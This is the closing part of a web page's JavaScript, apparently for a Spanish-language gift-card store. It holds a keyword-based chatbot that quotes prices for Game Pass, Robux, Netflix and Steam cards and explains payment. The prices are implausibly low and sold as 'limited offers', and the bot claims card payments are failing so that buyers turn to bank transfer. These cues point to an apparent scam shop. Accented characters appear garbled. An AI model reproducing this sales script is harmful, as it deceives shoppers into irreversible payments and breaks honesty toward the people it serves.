        if (lowerText.includes("precio") || lowerText.includes("costo")) {
            response = "Actualmente, la tarjeta de Game Pass cuesta $5.00 USD, 5,000 Robux cuesta $10.00 USD, Netflix cuesta $10.00 USD y la tarjeta de Steam $50 cuesta $15.00 USD. ¬°Son ofertas limitadas!";
        } else if (lowerText.includes("codigo") || lowerText.includes("clave")) {
            response = "Una vez confirmado el pago, el c√≥digo digital se env√≠a autom√°ticamente a tu correo electr√≥nico en menos de 5 minutos.";
        } else if (lowerText.includes("pago") || lowerText.includes("transferencia") || lowerText.includes("tarjeta")) {
            response = "Aceptamos **Transferencias Bancarias** (con los datos visibles en el formulario) y **Tarjeta de Cr√©dito/D√©bito** (Visa/Mastercard). Ten en cuenta que el pago con tarjeta est√° fallando actualmente, por lo que recomendamos la transferencia.";
        } else if (lowerText.includes("hola") || lowerText.includes("saludos")) {
            response = "¬°Hola! ¬øBuscas Game Pass, Robux, Netflix o Steam? Puedo darte informaci√≥n sobre los precios y el proceso de compra.";
        } else if (lowerText.includes("ayuda") || lowerText.includes("problema")) {
            response = "Si tienes un problema con una compra ya realizada, por favor, env√≠a un correo electr√≥nico a soporte@tutiendagc.com. Para dudas sobre la compra, preg√∫ntame aqu√≠.";
        } else {
            response = "Disculpa, a√∫n estoy aprendiendo. Por favor, pregunta sobre **'precios'**, **'c√≥digos'**, o **'m√©todos de pago'**.";
            typingDelay = 2500;
        }

        setTimeout(() => {
            typingIndicator.style.display = 'none';
            addMessage(response, 'ai');
        }, typingDelay); 
    }
</script>

</body>
</html>
